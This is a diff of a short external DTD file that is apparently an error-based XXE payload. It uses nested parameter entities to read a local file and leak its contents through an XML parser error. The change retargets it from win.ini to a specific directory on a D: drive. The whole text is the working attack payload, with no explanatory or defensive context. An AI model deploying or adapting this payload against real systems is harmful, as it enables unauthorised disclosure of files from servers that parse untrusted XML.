@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % file SYSTEM "file:///d:/magtech/userfiels">
 <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///GG%file;'>">
 %eval;
 %err;
